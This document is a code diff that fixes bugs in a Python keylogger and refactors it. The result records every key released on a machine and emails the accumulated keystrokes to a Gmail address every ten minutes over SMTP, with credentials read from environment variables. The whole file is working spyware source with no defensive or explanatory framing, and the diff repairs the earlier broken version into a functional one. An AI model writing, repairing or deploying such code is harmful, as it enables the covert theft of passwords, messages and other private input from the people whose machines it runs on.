@@ -1,135 +1,67 @@
-#!/usr/bin/python 
+#!/usr/bin/python
 
-import keyboard # for keylogs
-import smtplib # for sending email using SMTP
-# Semaphore is for blocking the current thread
-# Timer 
-from threading import Semaphore, Timer
+import keyboard  # for key logs
+import smtplib  # for sending email using SMTP
+import os  # for environment variables
+from threading import Timer
 
+# Configurations
+SEND_REPORT_EVERY = 600  # 10 minutes
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")  # Load from environment variable
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")  # Load from environment variable
 
-SEND_REPORT_EVERY = 600 # 10 minutes 
-EMAIL_ADRESS = "Your GMAIL Adress Here"
-EMAIL_PASSWORD = "YOUR EMAIL PASSWORD"
+if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
+    raise ValueError("Email and password must be set as environment variables.")
 
 class Keylogger:
-    def __init__(self, interval) :
-
-        #we gonna pass SEND_REPORT_EVERY to interval 
-
+    def __init__(self, interval):
         self.interval = interval
-        
-        # this is the string variable that contains the log 
+        self.log = ""  # the keystrokes within `self.interval`
 
-        # the keystrokes within `self.interval` 
-
-        self.log = ""
-
-        # for blocking after setting the on_release listener 
-
-        self.semaphore = Semaphore (0)
-
-    def callback(self, event) :
-        """This callback is invoked whenever a keyboard event is occured (i.e when a key is released in this example)"""
-
-        name= event.name 
+    def callback(self, event):
+        """This callback is invoked whenever a keyboard event is occurred (i.e when a key is released in this example)."""
+        name = event.name
 
         if len(name) > 1:
-
-            #not a character, special key (e.g ctrl, alt, etc.)
-
-            # uppercase with []
-            
-            if name == "space": 
-                # " " instead of "space"
-
+            # Special keys (e.g., ctrl, alt, etc.)
+            if name == "space":
                 name = " "
-
             elif name == "enter":
-                
-                # add a new line whenever an Enter is pressed 
-
-                name == "[ENTER]/"
-
+                name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
-
             else:
-
-                # replace spaces with underscores 
-
-                name = name.replace (" ", "_")
-
                 name = f" [{name.upper()}]"
 
-            self.log += name 
+        self.log += name
 
-    def sendmail(self, email, password, message):
-
-        # manages a connection to SMTP server
-
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-
-        
-        # connect to the SMTP server as TLS mode (for security)
-
-        server.starttls() 
-
-        # login to email account 
-
-        server.login(email, password)
-
-        # send the actual message 
-
-        server.sendmail(email, email, message)
-
-        # terminates the session 
-
-        server.quit()
+    def send_mail(self, message):
+        """Send the captured keystrokes via email."""
+        try:
+            with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
+                server.starttls()  # Start TLS encryption
+                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
+        except Exception as e:
+            print(f"Error sending email: {e}")
 
     def report(self):
-
-        """
-
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable 
-        
-        """
-
+        """This function gets called every `self.interval`. Sends keylogs and resets `self.log`."""
         if self.log:
+            self.send_mail(self.log)  # Send the captured keystrokes
+            self.log = ""  # Reset the log
 
-            # if there is something in log, report it
-
-            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-
-            # print(self.log)
-
-            self.log ""
-
-            Timer(interval=self.interval, function=self.report).start()
+        # Set the timer to call the report function again after the defined interval
+        Timer(interval=self.interval, function=self.report).start()
 
     def start(self):
+        """Start the keylogger."""
+        keyboard.on_release(callback=self.callback)  # Listen for key release events
+        self.report()  # Start reporting at intervals
 
-        # start the keylogger 
+        # Keep the program running indefinitely to capture keys
+        keyboard.wait()  # This blocks the program from exiting
 
-        keyboard.on_release(callback=self.callback)
-
-        # start reporting the keylogs 
-
-        self.report()
-
-        # block the current thread 
-
-        # since on_release() doesnt`t block the current thread 
-
-        # if we don`t block it, when we execute the program, nothing will happen 
-
-        # that is because on_release() will start the listener in a seperate thread 
-
-        self.semaphore.acquire()
-
-        if __name__ == "__main__":
-            keylogger = Keylogger(interval=SEND_REPORT_EVERY)
-
-            keylogger.start()
-
-
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
